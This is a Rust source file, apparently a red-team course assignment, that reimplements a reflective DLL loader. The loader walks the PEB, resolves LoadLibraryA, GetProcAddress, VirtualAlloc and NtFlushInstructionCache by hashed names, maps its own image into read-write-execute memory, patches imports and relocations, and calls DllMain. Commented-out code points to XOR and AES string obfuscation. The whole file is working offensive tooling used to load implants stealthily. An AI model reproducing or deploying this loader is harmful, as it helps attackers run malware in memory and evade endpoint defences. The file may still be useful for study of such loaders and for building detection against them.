//my rust implementation of https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c
#![allow(non_snake_case)]

use crate::crypto_util::{
    get_aes_encrypted_resource_bytes, get_aes_encrypted_resource_bytes_unmapped,
    get_xor_encrypted_string, get_xor_encrypted_string_unmapped,
};
use crate::hash::{hash, hash_case_insensitive};
use crate::util::{get_dll_base, get_resource_bytes, get_unmapped_resource_bytes, hi_word, low_word};
use std::mem::size_of;
use std::ptr::addr_of;
use std::{fs, mem};
use crate::windows::kernel32::{get_peb, GetProcAddress, LoadLibraryA, MEM_COMMIT, MEM_RESERVE, NtFlushInstructionCache, PAGE_EXECUTE_READWRITE, VirtualAlloc};
use crate::windows::ntdll::{DLL_PROCESS_ATTACH, DllMain, IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS, IMAGE_ORDINAL_FLAG, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH, IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW, IMAGE_RELOC, IMAGE_SECTION_HEADER, TRUNC_LDR_DATA_TABLE_ENTRY};

const KERNEL32DLL_HASH: u32 = 0x6A4ABC5B;
const NTDLLDLL_HASH: u32 = 0x3CFA685D;
const LOADLIBRARYA_HASH: u32 = 0xEC0E4E8E;
const GETPROCADDRESS_HASH: u32 = 0x7C0DFCAA;
const VIRTUALALLOC_HASH: u32 = 0x91AFCA54;
const NTFLUSHINSTRUCTIONCACHE_HASH: u32 = 0x534C0AB8;

#[no_mangle]
pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
    // STEP 0: calculate our images current base address.
    // I made it a function to be used elsewhere in the self-loading dll, like the final payload.

    let pLibraryAddress = get_dll_base();

    // if debugging from library tests, use a copy of the file loaded into memory, as the dll base.
    // let pLibraryAddress = fs::read(
    //     r"C:\Users\Nord\source\Hacking\Sektor7\RTO-MDI\03.Assignment\reflective-dll\target\debug\dyload.dll",
    // ).unwrap();
    // let pLibraryAddress = pLibraryAddress.as_ptr() as usize;

    // STEP 1: process the kernels exports for the functions our loader needs...
    // get the Process Environment Block
    let peb = get_peb();
    let pLdr = (*peb).Ldr;
    let mut pModuleList = (*pLdr).InMemoryOrderModuleList.Flink;

    // the functions we need
    let mut pLoadLibraryA = 0usize;
    let mut pGetProcAddress = 0usize;
    let mut pVirtualAlloc = 0usize;
    let mut pNtFlushInstructionCache = 0usize;

    while pModuleList as usize != 0 {
        // use a truncated definition of LDR_DATA_TABLE_ENTRY, since we are moving through the InMemoryOrderModuleList
        let pTruncLdrTableDataEntry = pModuleList as *const TRUNC_LDR_DATA_TABLE_ENTRY;
        // get pointer to current modules name (unicode string)
        let pBuffer = (*pTruncLdrTableDataEntry).BaseDllName.Buffer as usize;
        // set bCounter to the length for the loop
        let mut usCounter = (*pTruncLdrTableDataEntry).BaseDllName.Length as usize;
        // clear uiValueC which will store the hash of the module name
        let dwModuleHash = hash_case_insensitive(pBuffer, usCounter);

        // let KERNEL32DLL_HASH = get_xor_encrypted_string_unmapped(
        //     KERNEL32_DLL_HASH_POS,
        //     KERNEL32_DLL_HASH_KEY,
        //     KERNEL32_DLL_HASH_LEN,
        // );
        // let NTDLLDLL_HASH = get_xor_encrypted_string_unmapped(
        //     KERNEL32_DLL_HASH_POS,
        //     KERNEL32_DLL_HASH_KEY,
        //     KERNEL32_DLL_HASH_LEN,
        // );

        // TEMP DEBUG
        // let loadLibrary = GetProcAddress(
        //     GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
        //     "LoadLibraryA".as_bytes(),
        // );
        // let loadLibrary: LoadLibraryA = mem::transmute(loadLibrary);
        // let mut user32 = "USER32.dll".as_bytes().to_vec();
        // user32.push(0);
        // loadLibrary(user32.as_ptr());
        //
        // let window: MessageBoxA = mem::transmute(GetProcAddress(
        //     GetModuleHandle("USER32.dll".as_bytes().to_vec()),
        //     "MessageBoxA".as_bytes(),
        // ));
        // window(
        //     0,
        //     "Hello from self loader!\0".as_ptr(),
        //     "Reflective Dll Injection\0".as_ptr(),
        //     MB_OK,
        // );

        // compare the hash with that of kernel32.dll
        if dwModuleHash == KERNEL32DLL_HASH {
            // get this modules base address
            let lpBaseAddress = (*pTruncLdrTableDataEntry).DllBase;

            let pImageDosHeader = lpBaseAddress as *const IMAGE_DOS_HEADER;
            // get the VA of the modules NT Header
            let pImageNtHeaders =
                (lpBaseAddress + (*pImageDosHeader).e_lfanew as usize) as *const IMAGE_NT_HEADERS;

            // uiNameArray = the address of the modules export directory entry
            let pImageExportDirectory =
                &(*pImageNtHeaders).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

            // get the VA of the export directory
            let uiExportDir = (lpBaseAddress + pImageExportDirectory.VirtualAddress as usize)
                as *const IMAGE_EXPORT_DIRECTORY;

            // get the VA for the array of name pointers
            let uiNameArray =
                (lpBaseAddress + (*uiExportDir).AddressOfNames as usize) as *const u32;
            let sNameArray: &'static [u32] =
                std::slice::from_raw_parts(uiNameArray, (*uiExportDir).NumberOfNames as usize);

            // get the VA for the array of name ordinals
            let uiNameOrdinals =
                (lpBaseAddress + (*uiExportDir).AddressOfNameOrdinals as usize) as *const u16;
            let sNameOrdinals: &'static [u16] =
                std::slice::from_raw_parts(uiNameOrdinals, (*uiExportDir).NumberOfNames as usize);

            usCounter = 3;

            //const LOADLIBRARYA_HASH: u32 = 0xEC0E4E8E;
            //const GETPROCADDRESS_HASH: u32 = 0x7C0DFCAA;
            //const VIRTUALALLOC_HASH: u32 = 0x91AFCA54;
            // let LOADLIBRARYA_HASH = get_xor_encrypted_string_unmapped(LOADLIBRARYA_HASH_POS, LOADLIBRARYA_HASH_KEY, LOADLIBRARYA_HASH_LEN);
            // let GETPROCADDRESS_HASH = get_aes_encrypted_resource_bytes_unmapped(GETPROCADDRESS_HASH_POS,GETPROCADDRESS_HASH_LEN);
            // let VIRTUALALLOC_HASH = get_aes_encrypted_resource_bytes_unmapped(VIRTUALALLOC_HASH_POS,VIRTUALALLOC_HASH_LEN);

            for i in 0..sNameArray.len() {
                let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize);

                if dwHashValue == LOADLIBRARYA_HASH
                    || dwHashValue == GETPROCADDRESS_HASH
                    || dwHashValue == VIRTUALALLOC_HASH
                {
                    // get the VA for the array of addresses
                    let mut uiAddressArray =
                        lpBaseAddress + (*uiExportDir).AddressOfFunctions as usize;

                    // use this functions name ordinal as an index into the array of name pointers
                    uiAddressArray += sNameOrdinals[i] as usize * size_of::<u32>();

                    //cast to a u32 pointer, for readability.
                    let pAddressRVA = uiAddressArray as *const u32;

                    // store this functions VA
                    if dwHashValue == LOADLIBRARYA_HASH {
                        pLoadLibraryA = lpBaseAddress + *pAddressRVA as usize;
                    } else if dwHashValue == GETPROCADDRESS_HASH {
                        pGetProcAddress = lpBaseAddress + *pAddressRVA as usize;
                    } else if dwHashValue == VIRTUALALLOC_HASH {
                        pVirtualAlloc = lpBaseAddress + *pAddressRVA as usize;
                    }

                    usCounter -= 1;
                    if usCounter == 0 {
                        break;
                    }
                }
            }
        } else if dwModuleHash == NTDLLDLL_HASH {
            // get this modules base address
            let lpBaseAddress = (*pTruncLdrTableDataEntry).DllBase;

            let pImageDosHeader = lpBaseAddress as *const IMAGE_DOS_HEADER;
            // get the VA of the modules NT Header
            let pImageNtHeaders =
                (lpBaseAddress + (*pImageDosHeader).e_lfanew as usize) as *const IMAGE_NT_HEADERS;

            // uiNameArray = the address of the modules export directory entry
            let pImageExportDirectory =
                &(*pImageNtHeaders).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

            // get the VA of the export directory
            let uiExportDir = (lpBaseAddress + pImageExportDirectory.VirtualAddress as usize)
                as *const IMAGE_EXPORT_DIRECTORY;

            // get the VA for the array of name pointers
            let uiNameArray =
                (lpBaseAddress + (*uiExportDir).AddressOfNames as usize) as *const u32;
            let sNameArray: &'static [u32] =
                std::slice::from_raw_parts(uiNameArray, (*uiExportDir).NumberOfNames as usize);

            // get the VA for the array of name ordinals
            let uiNameOrdinals =
                (lpBaseAddress + (*uiExportDir).AddressOfNameOrdinals as usize) as *const u16;
            let sNameOrdinals: &'static [u16] =
                std::slice::from_raw_parts(uiNameOrdinals, (*uiExportDir).NumberOfNames as usize);

            usCounter = 1;

            // 0x534C0AB8;
            //let NTFLUSHINSTRUCTIONCACHE_HASH = get_xor_encrypted_string(NTFLUSHINSTRUCTIONCACHE_HASH_POS, NTFLUSHINSTRUCTIONCACHE_HASH_KEY, NTFLUSHINSTRUCTIONCACHE_HASH_LEN);
            //let b = get_resource_bytes(RESOURCE_ID, NTFLUSHINSTRUCTIONCACHE_HASH_POS, NTFLUSHINSTRUCTIONCACHE_HASH_LEN);
            //let NTFLUSHINSTRUCTIONCACHE_HASH = get_aes_encrypted_resource_bytes_unmapped(NTFLUSHINSTRUCTIONCACHE_HASH_POS,NTFLUSHINSTRUCTIONCACHE_HASH_LEN);

            for i in 0..sNameArray.len() {
                let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize);

                if dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH {
                    // get the VA for the array of addresses
                    let mut uiAddressArray =
                        lpBaseAddress + (*uiExportDir).AddressOfFunctions as usize;

                    // use this functions name ordinal as an index into the array of name pointers
                    uiAddressArray += sNameOrdinals[i] as usize * size_of::<u32>();

                    //cast to a u32 pointer, for readability.
                    let pAddressRVA = uiAddressArray as *const u32;

                    // store this functions VA
                    if dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH {
                        pNtFlushInstructionCache = lpBaseAddress + *pAddressRVA as usize;
                    }

                    usCounter -= 1;
                    if usCounter == 0 {
                        break;
                    }
                }
            }
        }

        // we stop searching when we have found everything we need.
        if pLoadLibraryA != 0
            && pGetProcAddress != 0
            && pVirtualAlloc != 0
            && pNtFlushInstructionCache != 0
        {
            break;
        }

        // get next entry
        pModuleList = (*pModuleList).Flink;
    }

    let fnLoadLibraryA: LoadLibraryA = mem::transmute(pLoadLibraryA);
    let fnGetProcAddress: GetProcAddress = mem::transmute(pGetProcAddress);
    let fnVirualAlloc: VirtualAlloc = mem::transmute(pVirtualAlloc);
    let fnNtFlushInstructionCache: NtFlushInstructionCache =
        mem::transmute(pNtFlushInstructionCache);

    // STEP 2: load our image into a new permanent location in memory...

    // get the VA of the NT Header for the PE to be loaded
    let pDosHeader = pLibraryAddress as *const IMAGE_DOS_HEADER;
    let pNtHeaders = (pLibraryAddress + (*pDosHeader).e_lfanew as usize) as *const IMAGE_NT_HEADERS;

    // allocate all the memory for the DLL to be loaded into. we can load at any address because we will
    // relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
    let pBaseAddress = fnVirualAlloc(
        0,
        (*pNtHeaders).OptionalHeader.SizeOfImage as usize,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    );

    // we must now copy over the headers
    let uiSize = (*pNtHeaders).OptionalHeader.SizeOfHeaders;

    // Make slices from the addresses we have, so that the process of copying over the data is easier, in rust.
    let sHeaderSource = std::slice::from_raw_parts(pLibraryAddress as *const u8, uiSize as usize);
    let sHeaderDest = std::slice::from_raw_parts_mut(pBaseAddress as *mut u8, uiSize as usize);

    for i in 0..sHeaderSource.len() {
        sHeaderDest[i] = sHeaderSource[i];
    }

    // STEP 3: load in all of our sections...

    // pImageNtHeaders = the VA of the first section
    let pImageNtHeaders =
        (pNtHeaders as usize + size_of::<IMAGE_NT_HEADERS>()) as *const IMAGE_SECTION_HEADER;

    // iterate through all sections, loading them into memory.
    let sImageSectionHeaders = std::slice::from_raw_parts(
        pImageNtHeaders,
        (*pNtHeaders).FileHeader.NumberOfSections as usize,
    );
    for sImageSectionHeader in sImageSectionHeaders {
        // lpDestAddress is the VA for this section
        let pDestAddress = pBaseAddress + sImageSectionHeader.VirtualAddress as usize;

        // lpSourceAddress is the VA for this sections data
        let pSourceAddress = pLibraryAddress + sImageSectionHeader.PointerToRawData as usize;

        // copy the entire section over
        let szSize = sImageSectionHeader.SizeOfRawData as usize;

        // Make slices from the addresses we have, so that the process of copying over the data is easier, in rust.
        let sSectionSource = std::slice::from_raw_parts(pSourceAddress as *const u8, szSize);
        let sSectionDest = std::slice::from_raw_parts_mut(pDestAddress as *mut u8, szSize);
        for i in 0..sSectionSource.len() {
            sSectionDest[i] = sSectionSource[i];
        }
    }

    // STEP 4: process our images import table...

    // uiValueB = the address of the import directory
    let pImageDataDirectory =
        &(*pNtHeaders).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    // we assume their is an import table to process
    // uiValueC is the first entry in the import table
    let pImageImportDescriptor = (pBaseAddress + pImageDataDirectory.VirtualAddress as usize)
        as *const IMAGE_IMPORT_DESCRIPTOR;
    // The size of the data directory always includes and extra blank entry, so we divide by the size of the struct and subtract 1 to get the length of the data directory.
    let length = pImageDataDirectory.Size as usize / size_of::<IMAGE_IMPORT_DESCRIPTOR>();
    let sImageImportDescriptors = std::slice::from_raw_parts(pImageImportDescriptor, length - 1);

    // iterate through all imports
    for sImageImportDescriptor in sImageImportDescriptors {
        // use LoadLibraryA to load the imported module into memory
        let pTargetLibraryAddress =
            fnLoadLibraryA((pBaseAddress + sImageImportDescriptor.Name as usize) as *const u8);

        // uiValueD = VA of the OriginalFirstThunk
        let mut pOriginalFirstThunk =
            (pBaseAddress + sImageImportDescriptor.OriginalFirstThunk as usize) as *const usize;

        // uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
        let mut pImportAddressTable =
            (pBaseAddress + sImageImportDescriptor.FirstThunk as usize) as *mut usize;

        // iterate through all imported functions, importing by ordinal if no name present
        while *pImportAddressTable != 0 {
            // sanity check uiValueD as some compilers only import by FirstThunk
            if *pOriginalFirstThunk & IMAGE_ORDINAL_FLAG != 0 {
                // get the VA of the modules NT Header
                let pLibDosHeader = pTargetLibraryAddress as *const IMAGE_DOS_HEADER;
                let pNtHeaders = (pTargetLibraryAddress + (*pLibDosHeader).e_lfanew as usize)
                    as *const IMAGE_NT_HEADERS;

                // uiNameArray = the address of the modules export directory entry
                let uiNameArray =
                    &(*pNtHeaders).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

                // get the VA of the export directory
                let uiExportDir = (pTargetLibraryAddress + uiNameArray.VirtualAddress as usize)
                    as *const IMAGE_EXPORT_DIRECTORY;

                // get the VA for the array of addresses
                let mut uiAddressArray =
                    pTargetLibraryAddress + (*uiExportDir).AddressOfFunctions as usize;

                // use the import ordinal (- export ordinal base) as an index into the array of addresses
                uiAddressArray += (((*pOriginalFirstThunk) & 0xffff)
                    - (*uiExportDir).Base as usize)
                    * size_of::<u32>();

                let pAddressRVA = uiAddressArray as *const u32;
                // patch in the address for this imported function
                *pImportAddressTable = pTargetLibraryAddress + *pAddressRVA as usize;
            } else {
                // get the VA of this functions import by name struct
                let pImageImportByName =
                    (pBaseAddress + *pImportAddressTable) as *const IMAGE_IMPORT_BY_NAME;

                // use GetProcAddress and patch in the address for this imported function
                *pImportAddressTable =
                    fnGetProcAddress(pTargetLibraryAddress, addr_of!((*pImageImportByName).Name));
            }

            // get the next imported function
            pImportAddressTable = (pImportAddressTable as usize + size_of::<usize>()) as *mut usize;
            pOriginalFirstThunk = (pOriginalFirstThunk as usize + size_of::<usize>()) as *mut usize;
        }
    }

    // STEP 5: process all of our images relocations...

    // calculate the base address delta and perform relocations (even if we load at desired image base)
    let szBaseAddressDelta = pBaseAddress.wrapping_sub((*pNtHeaders).OptionalHeader.ImageBase);

    // pBaseRelocDirectory = pointer to the relocation directory
    let pBaseRelocDirectory =
        &(*pNtHeaders).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // check if their are any relocations present
    if (*pBaseRelocDirectory).Size != 0 {
        // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
        let mut uiValueC = (pBaseAddress + (*pBaseRelocDirectory).VirtualAddress as usize)
            as *const IMAGE_BASE_RELOCATION;

        // and we itterate through all entries...
        while (*uiValueC).SizeOfBlock != 0 {
            // uiValueA = the VA for this relocation block
            let uiValueA = pBaseAddress + (*uiValueC).VirtualAddress as usize;

            // uiValueB = number of entries in this relocation block
            let uiValueB = ((*uiValueC).SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>())
                / size_of::<IMAGE_RELOC>();

            // uiValueD is now the first entry in the current relocation block
            let uiValueD =
                (uiValueC as usize + size_of::<IMAGE_BASE_RELOCATION>()) as *const IMAGE_RELOC;

            // we itterate through all the entries in the current block...
            // and since it's rust, we do it via a slice, because that's the way to go, if we can!
            let sImageRelocs = std::slice::from_raw_parts(uiValueD, uiValueB);
            for sImageReloc in sImageRelocs {
                // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                // we dont use a switch statement to avoid the compiler building a jump table
                // which would not be very position independent!
                if get_type(sImageReloc.bitfield) == IMAGE_REL_BASED_DIR64 {
                    let pRelocAddr = (uiValueA + get_offset(sImageReloc.bitfield)) as *mut usize;
                    *pRelocAddr = (*pRelocAddr).wrapping_add(szBaseAddressDelta);
                } else if get_type(sImageReloc.bitfield) == IMAGE_REL_BASED_HIGHLOW {
                    let pRelocAddr = (uiValueA + get_offset(sImageReloc.bitfield)) as *mut u32;
                    *pRelocAddr = (*pRelocAddr).wrapping_add(szBaseAddressDelta as u32)
                } else if get_type(sImageReloc.bitfield) == IMAGE_REL_BASED_HIGH {
                    let pRelocAddr = (uiValueA + get_offset(sImageReloc.bitfield)) as *mut u16;
                    *pRelocAddr += (*pRelocAddr).wrapping_add(hi_word(szBaseAddressDelta));
                } else if get_type(sImageReloc.bitfield) == IMAGE_REL_BASED_LOW {
                    let pRelocAddr = (uiValueA + get_offset(sImageReloc.bitfield)) as *mut u16;
                    *pRelocAddr += (*pRelocAddr).wrapping_add(low_word(szBaseAddressDelta));
                }
            }
            uiValueC = (uiValueC as usize + (*uiValueC).SizeOfBlock as usize)
                as *const IMAGE_BASE_RELOCATION;
        }
    }

    // STEP 6: call our images entry point

    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
    fnNtFlushInstructionCache(usize::MAX, 0, 0);

    // pDllMain = the VA of our newly loaded DLL/EXE's entry point
    let pDllMainAddr = pBaseAddress + (*pNtHeaders).OptionalHeader.AddressOfEntryPoint as usize;
    let pDllMain: DllMain = mem::transmute(pDllMainAddr);

    pDllMain(pBaseAddress, DLL_PROCESS_ATTACH, lpParameter);

    // STEP 7: return our new entry point address so whatever called us can call DllMain() if needed.
    return pDllMainAddr;
}



#[inline(always)]
fn get_offset(bitfield: u16) -> usize {
    (bitfield & 0xFFF) as usize
}

#[inline(always)]
fn get_type(bitfield: u16) -> u16 {
    bitfield >> 12
}
